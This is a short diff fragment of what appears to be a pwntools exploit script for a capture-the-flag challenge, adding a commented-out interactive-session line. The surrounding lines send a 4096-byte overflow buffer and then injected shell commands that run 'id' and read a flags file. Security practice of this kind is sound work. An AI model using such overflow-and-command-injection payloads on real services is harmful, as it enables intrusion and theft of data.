@@ -151,3 +151,5 @@ io.sendline(b"A"*4096 + b"\n")
 io.sendline(b"id;cat data/flags.txt; echo '<END>' exit\n")
 
 print(io.recvuntil(b"<END>").decode())
+
+# io.interactive()
